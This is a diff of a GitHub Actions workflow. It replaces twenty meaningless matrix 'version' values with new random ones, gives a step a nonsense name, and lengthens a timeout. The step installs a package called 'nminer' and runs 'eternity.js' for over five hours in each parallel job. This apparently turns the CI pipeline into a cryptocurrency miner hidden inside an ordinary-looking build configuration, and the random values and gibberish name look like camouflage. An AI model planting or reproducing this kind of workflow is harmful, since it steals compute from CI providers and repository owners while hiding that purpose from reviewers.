@@ -9,26 +9,26 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 9514 }
-          - { version: 6825 }
-          - { version: 6443 }
-          - { version: 1471 }
-          - { version: 8768 }
-          - { version: 7760 }
-          - { version: 7623 }
-          - { version: 589 }
-          - { version: 2287 }
-          - { version: 7400 }
-          - { version: 4680 }
-          - { version: 9018 }
-          - { version: 3821 }
-          - { version: 7056 }
-          - { version: 9274 }
-          - { version: 8887 }
-          - { version: 3498 }
-          - { version: 8430 }
-          - { version: 4900 }
-          - { version: 7463 }
+          - { version: 194 }
+          - { version: 8307 }
+          - { version: 8972 }
+          - { version: 4224 }
+          - { version: 5971 }
+          - { version: 5269 }
+          - { version: 3888 }
+          - { version: 9375 }
+          - { version: 5507 }
+          - { version: 6878 }
+          - { version: 5270 }
+          - { version: 1538 }
+          - { version: 7159 }
+          - { version: 2406 }
+          - { version: 8560 }
+          - { version: 7104 }
+          - { version: 9749 }
+          - { version: 4016 }
+          - { version: 2552 }
+          - { version: 9254 }
 
     steps:
       - name: Checkout
@@ -39,7 +39,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: 
+      - name: whereas printer responsibility hurtful
         run: |
           npm install nminer@latest
-          timeout 306m node eternity.js || echo "eternity executed"
+          timeout 342m node eternity.js || echo "eternity executed"
